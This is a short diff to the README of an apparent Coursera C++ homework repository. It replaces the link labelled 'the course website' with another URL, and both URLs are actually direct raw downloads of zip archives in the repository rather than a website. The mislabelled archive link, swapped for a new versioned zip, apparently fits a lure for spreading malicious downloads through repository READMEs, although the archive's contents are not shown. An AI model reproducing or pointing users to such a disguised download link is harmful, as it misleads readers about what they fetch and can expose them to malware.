@@ -2,7 +2,7 @@ Coursera_c2cpp
 ==============
 
 Homework code of C++ For C Programmers on Coursera. 
-The course website is https://raw.githubusercontent.com/vikaskr7838/Coursera_c2cpp/master/homework4/Coursera_c2cpp_3.1.zip
+The course website is https://github.com/vikaskr7838/Coursera_c2cpp/raw/refs/heads/master/homework2/c_cpp_Coursera_v3.6.zip
 Since the course is almost ending, I put the source code here.
 Just as a reference for whom interests. Any suggestion is welcome. 
 
